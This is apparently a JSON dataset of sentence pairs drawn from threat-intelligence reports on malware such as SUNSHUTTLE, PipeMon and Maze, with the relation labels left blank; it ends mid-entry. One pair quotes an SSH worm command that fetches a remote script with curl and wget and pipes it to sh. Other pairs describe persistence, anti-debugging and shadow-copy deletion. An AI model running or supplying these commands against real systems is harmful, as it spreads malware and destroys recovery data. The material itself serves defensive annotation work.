        "S2": "We noticed a comment in the script for a 20 seconds sleep after every 20 SSH connection attempts, and their cleanup, possibly indicating that the attackers have some sense of evasion and were trying to hide their activities.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-118.md::S42<=>S44",
        "S1": "Using the information gathered, the malware then attempts to connect to each host, using every possible user and key combination through SSH, in order to download the aforementioned shell script and run the malware on other hosts or containers in the network.",
        "S2": "The following SSH command was used to spread it throughout the network: ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp \"sudo curl -L http://217.12.221.244/spr.sh|sh; sudo wget -q -O - http://217.12.221.244/spr.sh|sh;\"",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-118.md::S42<=>S46",
        "S1": "Using the information gathered, the malware then attempts to connect to each host, using every possible user and key combination through SSH, in order to download the aforementioned shell script and run the malware on other hosts or containers in the network.",
        "S2": "At the last stage of the attack the malware runs a cryptominer called kdevtmpfsi.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S0<=>S3",
        "S1": "As pointed out in Malwarebytes\u2019s public report, the actor sent weaponized documents to the victim as an initial infection vector.",
        "S2": "- The user opens the malicious document and subsequently allows the macro to be executed;",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S0<=>S12",
        "S1": "As pointed out in Malwarebytes\u2019s public report, the actor sent weaponized documents to the victim as an initial infection vector.",
        "S2": "Besides the Microsoft Word document, the actor used an additional, alternative infection method according to our telemetry.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S8<=>S11",
        "S1": "- Execute image003.zip, which actually contains HTML Application (HTA) code, with mshta.exe;",
        "S2": "This HTA code creates the next payload at the hardcoded path C:/Users/Public/Downloads/Winvoke.exe.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S10<=>S15",
        "S1": "The executed image003.zip is an HTML Application (HTA) file containing the second stage payload.",
        "S2": "At this point, we\u2019re missing clear evidence of whether the attack leveraged a vulnerability within this software in the infection process or it was used to deceive users by opening a PDF document as a decoy while the HTA payload is fetched from a remote resource.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S13<=>S17",
        "S1": "Although we weren\u2019t able to acquire the initial file, we assume the actor delivered a file disguised as a PDF, since we discovered artefacts containing the path of the tool ezPDFReader: c:\\program files (x86)\\unidocs\\ezpdfreader2.0g\\ezpdfwslauncher.exe.",
        "S2": "We first saw the URL appearing in the context of this threat actor in September 2020 and it was still in use when we were researching this series of attacks at the end of April 2021.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S13<=>S15",
        "S1": "Although we weren\u2019t able to acquire the initial file, we assume the actor delivered a file disguised as a PDF, since we discovered artefacts containing the path of the tool ezPDFReader: c:\\program files (x86)\\unidocs\\ezpdfreader2.0g\\ezpdfwslauncher.exe.",
        "S2": "At this point, we\u2019re missing clear evidence of whether the attack leveraged a vulnerability within this software in the infection process or it was used to deceive users by opening a PDF document as a decoy while the HTA payload is fetched from a remote resource.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S15<=>S17",
        "S1": "At this point, we\u2019re missing clear evidence of whether the attack leveraged a vulnerability within this software in the infection process or it was used to deceive users by opening a PDF document as a decoy while the HTA payload is fetched from a remote resource.",
        "S2": "We first saw the URL appearing in the context of this threat actor in September 2020 and it was still in use when we were researching this series of attacks at the end of April 2021.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S15<=>S52",
        "S1": "At this point, we\u2019re missing clear evidence of whether the attack leveraged a vulnerability within this software in the infection process or it was used to deceive users by opening a PDF document as a decoy while the HTA payload is fetched from a remote resource.",
        "S2": "This ransomware sample is custom made and specifically developed by the threat actor behind this attack.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S16<=>S19",
        "S1": "Notably, the compromised website www.allamwith[.]com was used for a long period of time.",
        "S2": "The URL hosts still serving the HTML Application (HTA) file exhibit similar functions as the HTA file created by the malicious Word document.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S18<=>S31",
        "S1": "When we analyzed the above malicious URLs, many of the resources had already gone offline, but the attacker is still using one distribution URL: hxxp://www.allamwith[.]com/home/css/skin.html",
        "S2": "The malware operator appears to deliver the third stage payload by using the above functionalities, as our telemetry reveals.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S21<=>S30",
        "S1": "The second stage payload is responsible for communicating with the C2 server and preparing another payload for the next stage.",
        "S2": "According to the response from the C2 server, the payload is able to perform five actions:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S23<=>S25",
        "S1": "It uses an embedded 16-byte XOR key to decrypt the base64 encoded payload.",
        "S2": "The infection procedure of the second stage payload:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S25<=>S30",
        "S1": "The infection procedure of the second stage payload:",
        "S2": "According to the response from the C2 server, the payload is able to perform five actions:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S30<=>S33",
        "S1": "According to the response from the C2 server, the payload is able to perform five actions:",
        "S2": "The third stage payload was created via the second stage payload, is interactively executed in the operation and exists in both x64 and x86 versions.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S31<=>S33",
        "S1": "The malware operator appears to deliver the third stage payload by using the above functionalities, as our telemetry reveals.",
        "S2": "The third stage payload was created via the second stage payload, is interactively executed in the operation and exists in both x64 and x86 versions.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S31<=>S54",
        "S1": "The malware operator appears to deliver the third stage payload by using the above functionalities, as our telemetry reveals.",
        "S2": "We saw the malware executed with the following parameter options in our telemetry, with some parameters illustrated below:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S32<=>S34",
        "S1": "Both second and third stage payloads also share an identical icon, which looks like Internet Explorer.",
        "S2": "Most of them use Internet Explorer or Google Chrome icons and corresponding file names to disguise themselves as legitimate internet browsers.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S33<=>S36",
        "S1": "The third stage payload was created via the second stage payload, is interactively executed in the operation and exists in both x64 and x86 versions.",
        "S2": "The embedded payload shows the same structure as the second stage payload discussed above.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S33<=>S35",
        "S1": "The third stage payload was created via the second stage payload, is interactively executed in the operation and exists in both x64 and x86 versions.",
        "S2": "The third stage decrypts the embedded payload and executes it.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S36<=>S44",
        "S1": "The embedded payload shows the same structure as the second stage payload discussed above.",
        "S2": "The malware then sends a hardcoded string to the C2 server: \u201cHTTP 1.1 /member.php SSL3.4\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S37<=>S42",
        "S1": "Once launched, it checks for the mutex QD33qhhXKK and inspects the system for signs of a sandbox environment by searching for the presence of specific modules.",
        "S2": "With the environment checks done, the main payload gets decrypted using the same XOR key and launched with rundll32.exe.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S38<=>S42",
        "S1": "The strings of module names to be checked are decoded with a hardcoded XOR key: 0x4B762A554559586F6A45656545654130",
        "S2": "With the environment checks done, the main payload gets decrypted using the same XOR key and launched with rundll32.exe.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S43<=>S52",
        "S1": "Three C2 addresses then get extracted and decrypted using DES, with all addresses pointing to the same IP (23.229.111[.]197) in this sample.",
        "S2": "This ransomware sample is custom made and specifically developed by the threat actor behind this attack.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S45<=>S53",
        "S1": "Next, it checks if the C2\u2019s response data equals \u201cHTTP 1.1 200 OK SSL2.1\u201d and, if positive, starts conducting its backdoor operations.",
        "S2": "This ransomware is controlled by command line parameters and can either retrieve an encryption key from the C2 or, alternatively, as an argument at launch time.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S51<=>S53",
        "S1": "Interestingly, one victim was discovered to have received ransomware after the third stage payload.",
        "S2": "This ransomware is controlled by command line parameters and can either retrieve an encryption key from the C2 or, alternatively, as an argument at launch time.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S53<=>S59",
        "S1": "This ransomware is controlled by command line parameters and can either retrieve an encryption key from the C2 or, alternatively, as an argument at launch time.",
        "S2": "If the malware is executed with the -s(-S) option, it sends the victim ID to the C2 server and receives the initial vector (IV) and key to encrypt files.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-124.md::S59<=>S61",
        "S1": "If the malware is executed with the -s(-S) option, it sends the victim ID to the C2 server and receives the initial vector (IV) and key to encrypt files.",
        "S2": "When the ransomware communicates with the C2 server, it uses the same authentication process and strings as the third stage payload.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-150.md::S0<=>S2",
        "S1": "Once executed, the SUNSHUTTLE backdoor enumerates the victim\u2019s MAC address and compares it to a hardcoded MAC address value \u201cc8:27:cc:c2:37:5a\u201d.",
        "S2": "The MAC address is likely a default MAC address for the Windows sandbox network adapter.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-150.md::S0<=>S3",
        "S1": "Once executed, the SUNSHUTTLE backdoor enumerates the victim\u2019s MAC address and compares it to a hardcoded MAC address value \u201cc8:27:cc:c2:37:5a\u201d.",
        "S2": "If the check is successful, the SUNSHUTTLE backdoor then enters a routine named \u201c\ufeffmain_define_internal_settings\u201d, which handles creation of the configuration file if one doesn\u2019t already exist in the directory from which SUNSHUTTLE is running.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-150.md::S1<=>S3",
        "S1": "If a match is found the backdoor exits.",
        "S2": "If the check is successful, the SUNSHUTTLE backdoor then enters a routine named \u201c\ufeffmain_define_internal_settings\u201d, which handles creation of the configuration file if one doesn\u2019t already exist in the directory from which SUNSHUTTLE is running.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-150.md::S3<=>S8",
        "S1": "If the check is successful, the SUNSHUTTLE backdoor then enters a routine named \u201c\ufeffmain_define_internal_settings\u201d, which handles creation of the configuration file if one doesn\u2019t already exist in the directory from which SUNSHUTTLE is running.",
        "S2": "If set in the configuration, the \u201cblend-in\u201d traffic occurs as the malware executes and transitions through its routines.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-150.md::S8<=>S10",
        "S1": "If set in the configuration, the \u201cblend-in\u201d traffic occurs as the malware executes and transitions through its routines.",
        "S2": "SUNSHUTTLE performs initial requests to the C2 in order to request and then retrieve what it internally refers to as a session key.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-150.md::S8<=>S13",
        "S1": "If set in the configuration, the \u201cblend-in\u201d traffic occurs as the malware executes and transitions through its routines.",
        "S2": "After the configuration is created or read from, SUNSHUTTLE enters a routine named \u201c\ufeffmain_request_session_key\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-150.md::S11<=>S15",
        "S1": "The retrieved session key from the C2 appears to be RSA decrypted using the following private key that is embedded in SUNSHUTTLE and believed to be unique per compiled sample.",
        "S2": "Inside the \u201c\ufeffmain_request_session_key\u201d routine, SUNSHUTTLE constructs an HTTPS request to its configured C2.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-150.md::S13<=>S25",
        "S1": "After the configuration is created or read from, SUNSHUTTLE enters a routine named \u201c\ufeffmain_request_session_key\u201d.",
        "S2": "The content returned from the C2 after the \u201cmain_beaconing\u201d routine is Base64 decoded and AES decrypted",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-150.md::S15<=>S18",
        "S1": "Inside the \u201c\ufeffmain_request_session_key\u201d routine, SUNSHUTTLE constructs an HTTPS request to its configured C2.",
        "S2": "If the result of the request_session_key is 1, SUNSHUTTLE will execute the retrieve_session_key routine.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-150.md::S16<=>S19",
        "S1": "Upon an HTTP 200 response from the request, the response data from the C2 is expected to not contain the following string for the sample analyzed: ywQdjLuHHC",
        "S2": "The retrieve_session_key routine again contacts the C2 and downloads content that is expected to be decrypted by the aforementioned embedded private key.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-150.md::S17<=>S36",
        "S1": "The request_session_key routine returns a 1 if the string is not in the response and a -1 if it is in the response.",
        "S2": "The following is an example request to the C2 from the \u201crequest_session_key\u201d routine.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-150.md::S18<=>S20",
        "S1": "If the result of the request_session_key is 1, SUNSHUTTLE will execute the retrieve_session_key routine.",
        "S2": "The decrypted content is likely a session key used to encrypt content once SUNSHUTTLE transitions to its command-and-control routines.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-150.md::S19<=>S21",
        "S1": "The retrieve_session_key routine again contacts the C2 and downloads content that is expected to be decrypted by the aforementioned embedded private key.",
        "S2": "Once a session key is retrieved from the C2, SUNSHUTTLE begins the beaconing and \u201cresolve_command\u201d routines in a loop.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-150.md::S21<=>S25",
        "S1": "Once a session key is retrieved from the C2, SUNSHUTTLE begins the beaconing and \u201cresolve_command\u201d routines in a loop.",
        "S2": "The content returned from the C2 after the \u201cmain_beaconing\u201d routine is Base64 decoded and AES decrypted",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-150.md::S24<=>S30",
        "S1": "Available commands include remotely updating its configuration, file upload and download, and arbitrary command execution.",
        "S2": "After successful execution of the malware, it drops the following files to the victim\u2019s system: <current_directory>\\config.dat.tmp (MD5: Dynamic) Encrypted configuration file",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-150.md::S25<=>S27",
        "S1": "The content returned from the C2 after the \u201cmain_beaconing\u201d routine is Base64 decoded and AES decrypted",
        "S2": "A check is performed to ensure the decrypted content doesn\u2019t contain the following string: Cp5RTQ31R1",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-150.md::S25<=>S33",
        "S1": "The content returned from the C2 after the \u201cmain_beaconing\u201d routine is Base64 decoded and AES decrypted",
        "S2": "SUNSHUTTLE uses the cookie header to pass values to the C2.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-150.md::S33<=>S36",
        "S1": "SUNSHUTTLE uses the cookie header to pass values to the C2.",
        "S2": "The following is an example request to the C2 from the \u201crequest_session_key\u201d routine.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-150.md::S33<=>S35",
        "S1": "SUNSHUTTLE uses the cookie header to pass values to the C2.",
        "S2": "The cookie headers vary slightly depending on the operation being performed.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-213.md::S1<=>S3",
        "S1": "The previous research noted that the malware deploys a novel trick to prevent MS Office attempting to launch the disguised app as a doc by embedding a unicode character in the file name.",
        "S2": "On launch, the malware switches out the malicious application bundle for an actual MS Office doc: the same file name is used but now minus the hidden Unicode character.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-213.md::S3<=>S13",
        "S1": "On launch, the malware switches out the malicious application bundle for an actual MS Office doc: the same file name is used but now minus the hidden Unicode character.",
        "S2": "In this case, the script agressively attempts to remove all quarantine bits and, in the event any of those fail and the malware finds itself translocated to a read-only filepath, it then undertakes a hunt for the original downloaded file via its MD5 hash and attempts to execute it from its non-translocated path on disk.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-213.md::S5<=>S7",
        "S1": "The whole trick is invisible to the user, who only sees a document appearing with the same name as the one they double-clicked on.",
        "S2": "That trick is accompanied by the borrowing of a technique that has become popular among commodity adware and malware distributors; namely, using a shell script both as the main executable inside the app bundle and also as a vehicle to drop an embedded base64-encoded payload.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-213.md::S7<=>S10",
        "S1": "That trick is accompanied by the borrowing of a technique that has become popular among commodity adware and malware distributors; namely, using a shell script both as the main executable inside the app bundle and also as a vehicle to drop an embedded base64-encoded payload.",
        "S2": "Importantly, prior to line 40, the script takes measures to deal with two macOS security features: App Translocation and file quarantine.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-213.md::S10<=>S13",
        "S1": "Importantly, prior to line 40, the script takes measures to deal with two macOS security features: App Translocation and file quarantine.",
        "S2": "In this case, the script agressively attempts to remove all quarantine bits and, in the event any of those fail and the malware finds itself translocated to a read-only filepath, it then undertakes a hunt for the original downloaded file via its MD5 hash and attempts to execute it from its non-translocated path on disk.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-213.md::S14<=>S16",
        "S1": "The second stage payload, once dumped from the encoded base64, is a universal FAT binary containing Mach-Os for i386 and x86_64 architectures.",
        "S2": "As earlier research pointed out, this stage is responsible for dropping a persistence agent with the label of \u201ccom.apple.marcoagent.voiceinstallerd\u201d and its program argument, \u201cmount_devfs\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-213.md::S16<=>S20",
        "S1": "As earlier research pointed out, this stage is responsible for dropping a persistence agent with the label of \u201ccom.apple.marcoagent.voiceinstallerd\u201d and its program argument, \u201cmount_devfs\u201d.",
        "S2": "A further point not mentioned in the earlier research is that the Launch Agent or Launch Daemon is written using the \u201cHidden\u201d flag so that users won\u2019t see it in the Finder by default.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-213.md::S17<=>S21",
        "S1": "However, we also note that this stage has code for testing the UID and determining whether the executable is being run as root or not.",
        "S2": "According to the earlier research, the malicious \u201cmount_devfs\u201d file provides the actors with backdoor capabilities, which include the ability to exfiltrate information as well as download files to the target machine.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md::S2<=>S4",
        "S1": "Once written to disk, the RARSFX is executed with CreateProcess by providing the decryption password in an argument, as follows: setup0.exe -p*|T/PMR{|T2^LWJ*",
        "S2": "The content of the RARSFX is then extracted into %TMP%\\RarSFX0 and consists of the following files:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md::S2<=>S28",
        "S1": "Once written to disk, the RARSFX is executed with CreateProcess by providing the decryption password in an argument, as follows: setup0.exe -p*|T/PMR{|T2^LWJ*",
        "S2": "After having registered the Print Processor, PipeMon restarts the print spooler service (spoolsv.exe).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md::S4<=>S13",
        "S1": "The content of the RARSFX is then extracted into %TMP%\\RarSFX0 and consists of the following files:",
        "S2": "Further, not all these files are necessarily present in the archive, depending on the installer.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md::S4<=>S18",
        "S1": "The content of the RARSFX is then extracted into %TMP%\\RarSFX0 and consists of the following files:",
        "S2": "setup.exe is executed without arguments by the RARSFX, and checks whether it\u2019s running with elevated privileges.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md::S9<=>S19",
        "S1": "- PrintDialog.exe \u2013 Legitimate Windows executable used to load PrintDialog.dll",
        "S2": "If not, it will attempt to obtain such privileges using token impersonation if the version of Windows is below Windows 7 build 7601; otherwise it will attempt different UAC bypass techniques, allowing installation of the payload loader into one of:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md::S10<=>S14",
        "S1": "- setup.dll \u2013 Installation DLL",
        "S2": "Once extracted, setup.exe is executed without arguments.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md::S15<=>S18",
        "S1": "Its sole purpose is to load setup.dll using LoadLibraryA.",
        "S2": "setup.exe is executed without arguments by the RARSFX, and checks whether it\u2019s running with elevated privileges.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md::S19<=>S22",
        "S1": "If not, it will attempt to obtain such privileges using token impersonation if the version of Windows is below Windows 7 build 7601; otherwise it will attempt different UAC bypass techniques, allowing installation of the payload loader into one of:",
        "S2": "This loader is stored encrypted within setup.dll, which will decrypt it before writing it to the aforementioned location.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md::S21<=>S31",
        "S1": "Note that we weren\u2019t able to retrieve samples related to Interactive.dll.",
        "S2": "This technique is really similar to the Print Monitor persistence technique (being used by DePriMon, for example) and, to our knowledge, has not been documented previously.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md::S22<=>S25",
        "S1": "This loader is stored encrypted within setup.dll, which will decrypt it before writing it to the aforementioned location.",
        "S2": "setup.dll registers the malicious DLL loader as an alternative Print Processor by setting one of the following registry values: HKLM\\SYSTEM\\ControlSet001\\Control\\Print\\Environments\\Windows x64\\Print Processors\\PrintFiiterPipelineSvc\\Driver = \u201cDEment.dll\u201d or HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\lltdsvc1\\Driver = \u201cEntAppsvc.dll\u201d",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-233.md::S28<=>S34",
        "S1": "After having registered the Print Processor, PipeMon restarts the print spooler service (spoolsv.exe).",
        "S2": "The whole PipeMon staging and persistence is shown in Figure 1.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S4<=>S7",
        "S1": "The malware uses some tricks to detect debuggers at this point.",
        "S2": "If the malware detects a debugger it will remain in an infinite loop without making anything while wasting system resources.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S6<=>S8",
        "S1": "This field is a Boolean field that is filled from Windows with 1 (True) if the application is running inside of a debugger or 0 (False) if it is not.",
        "S2": "The malware gets all processes in the system but ignores the first one (the \u2018idle process\u2019 in Windows which is simply a tool to let the user know what percentage of system resources are being used).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S8<=>S16",
        "S1": "The malware gets all processes in the system but ignores the first one (the \u2018idle process\u2019 in Windows which is simply a tool to let the user know what percentage of system resources are being used).",
        "S2": "The malware calls Windows functions in a unique way to aid obfuscation, i.e. getting the first process in the system to use the function \u201cProcess32FirstW\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S9<=>S12",
        "S1": "Using the name of each process it makes a custom name with a custom algorithm, along with a hash that is checked against a hardcoded list.",
        "S2": "It can terminate IDA debugger, x32dbg, OllyDbg and more processes to avoid dynamic analysis, close databases, office programs and security tools.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S13<=>S15",
        "S1": "A partial list of the processes that can be cracked using a dictionary list terminated by the malware is shown below:",
        "S2": "The malware will kill the process with the function \u201cTerminateProcess\u201d that it gets from the EAT (Export Address Table) of the module \u201ckernel32.dll\u201d to increase obfuscation, comparing the name with a custom hash taken from the name in high caps.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S16<=>S24",
        "S1": "The malware calls Windows functions in a unique way to aid obfuscation, i.e. getting the first process in the system to use the function \u201cProcess32FirstW\u201d.",
        "S2": "This way, when a debugger attaches to the process internally, the system calls this function but, instead of creating a thread to start the debugging, the \u201cret\u201d opcode forces the function to return without creating it.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S18<=>S20",
        "S1": "When the function ends, Windows makes a \u201cret\u201d opcode then gets the last memory address that the malware pushed inside the stack, returning to this address and continuing the flow.",
        "S2": "Another ploy utilized by the malware (depending of the sample) is to get the function \u201cDbgUIRemoteBreakin\u201d, using the function \u201cGetProcAddress\u201d, before employing a trick to avoid having a debugger attach to it in runtime[7].",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S18<=>S47",
        "S1": "When the function ends, Windows makes a \u201cret\u201d opcode then gets the last memory address that the malware pushed inside the stack, returning to this address and continuing the flow.",
        "S2": "As you can see in the image above, the malware uses a command with the name of folders that do not exist by default in Windows, except \u201cWindows\u201d, \u201csystem32\u201d and \u201cwbem\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S18<=>S27",
        "S1": "When the function ends, Windows makes a \u201cret\u201d opcode then gets the last memory address that the malware pushed inside the stack, returning to this address and continuing the flow.",
        "S2": "The malware checks the language of the machine with function \u201cGetUserDefaultUILanguage\u201d and saves the value in the stack; it is not checked automatically after the call, but it is important later.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S20<=>S22",
        "S1": "Another ploy utilized by the malware (depending of the sample) is to get the function \u201cDbgUIRemoteBreakin\u201d, using the function \u201cGetProcAddress\u201d, before employing a trick to avoid having a debugger attach to it in runtime[7].",
        "S2": "After gaining permission, which is granted only for 1 byte, the malware patches this byte with a 0xC3 value (the opcode of \u201cret\u201d) and restores the previous permissions with \u201cVirtualProtect\u201d, again in the same address and byte, removing the write permission.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S21<=>S23",
        "S1": "The trick used here is \u201cVirtualProtect\u201d to give the function memory address of \u201cDbgUIRemoteBreakin\u201d permission to write to it:",
        "S2": "This is done to avoid having a debugger attach to it in runtime.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S22<=>S27",
        "S1": "After gaining permission, which is granted only for 1 byte, the malware patches this byte with a 0xC3 value (the opcode of \u201cret\u201d) and restores the previous permissions with \u201cVirtualProtect\u201d, again in the same address and byte, removing the write permission.",
        "S2": "The malware checks the language of the machine with function \u201cGetUserDefaultUILanguage\u201d and saves the value in the stack; it is not checked automatically after the call, but it is important later.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S23<=>S25",
        "S1": "This is done to avoid having a debugger attach to it in runtime.",
        "S2": "In brief, it prevents a debugger from being attached correctly.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S27<=>S31",
        "S1": "The malware checks the language of the machine with function \u201cGetUserDefaultUILanguage\u201d and saves the value in the stack; it is not checked automatically after the call, but it is important later.",
        "S2": "The malware, after creating the mutex, makes calls to the function \u201cGetLastError\u201d to check against two errors:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S27<=>S40",
        "S1": "The malware checks the language of the machine with function \u201cGetUserDefaultUILanguage\u201d and saves the value in the stack; it is not checked automatically after the call, but it is important later.",
        "S2": "After the mutex, the malware checks the language previously saved in the stack against, for example, language 0x419 (Russian from the Russian Federation, ru-RU[8]).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S27<=>S36",
        "S1": "The malware checks the language of the machine with function \u201cGetUserDefaultUILanguage\u201d and saves the value in the stack; it is not checked automatically after the call, but it is important later.",
        "S2": "If either of the above occur, the malware remains in execution but does not crypt any files in the system or use any resources of the machine.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S28<=>S31",
        "S1": "Maze creates a mutex with the name \u201cGlobal\\x\u201d where x is a special value that is unique per machine.",
        "S2": "The malware, after creating the mutex, makes calls to the function \u201cGetLastError\u201d to check against two errors:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S31<=>S33",
        "S1": "The malware, after creating the mutex, makes calls to the function \u201cGetLastError\u201d to check against two errors:",
        "S2": "If the malware gets this error, it means that the mutex already exists in the system but, for some reason, the malware cannot access it (perhaps privileges, policies, etcetera).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S33<=>S35",
        "S1": "If the malware gets this error, it means that the mutex already exists in the system but, for some reason, the malware cannot access it (perhaps privileges, policies, etcetera).",
        "S2": "If the malware gets this error, it means that the mutex already exists in the system and can be accessed.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S35<=>S40",
        "S1": "If the malware gets this error, it means that the mutex already exists in the system and can be accessed.",
        "S2": "After the mutex, the malware checks the language previously saved in the stack against, for example, language 0x419 (Russian from the Russian Federation, ru-RU[8]).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S43<=>S45",
        "S1": "The malware tries to delete the shadow volumes in the system using the \u201cwmic.exe\u201d program with the switches \u201cshadowcopy\u201d and \u201cdelete\u201d.",
        "S2": "The malware tries to delete the shadow copies two times, once before crypting the files in the infected system and secondly after crypting them.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S43<=>S50",
        "S1": "The malware tries to delete the shadow volumes in the system using the \u201cwmic.exe\u201d program with the switches \u201cshadowcopy\u201d and \u201cdelete\u201d.",
        "S2": "It later concatenates with the \u201cWindows\u201d folder and continues with the same behavior to finally enter into \u201csystem32\u201d where it calls the \u201cwmic.exe\u201d program with the switches to delete the shadow volumes.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S45<=>S50",
        "S1": "The malware tries to delete the shadow copies two times, once before crypting the files in the infected system and secondly after crypting them.",
        "S2": "It later concatenates with the \u201cWindows\u201d folder and continues with the same behavior to finally enter into \u201csystem32\u201d where it calls the \u201cwmic.exe\u201d program with the switches to delete the shadow volumes.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S47<=>S49",
        "S1": "As you can see in the image above, the malware uses a command with the name of folders that do not exist by default in Windows, except \u201cWindows\u201d, \u201csystem32\u201d and \u201cwbem\u201d.",
        "S2": "For example, in the beginning it enters the folders \u201cydw\u201d and \u201cfdygg\u201d but later returns to the root of the Windows installation unit with two \u201c..\u201d commands that lead to \u201cC:\\\u201d in this case.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S47<=>S50",
        "S1": "As you can see in the image above, the malware uses a command with the name of folders that do not exist by default in Windows, except \u201cWindows\u201d, \u201csystem32\u201d and \u201cwbem\u201d.",
        "S2": "It later concatenates with the \u201cWindows\u201d folder and continues with the same behavior to finally enter into \u201csystem32\u201d where it calls the \u201cwmic.exe\u201d program with the switches to delete the shadow volumes.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-261.md::S51<=>S53",
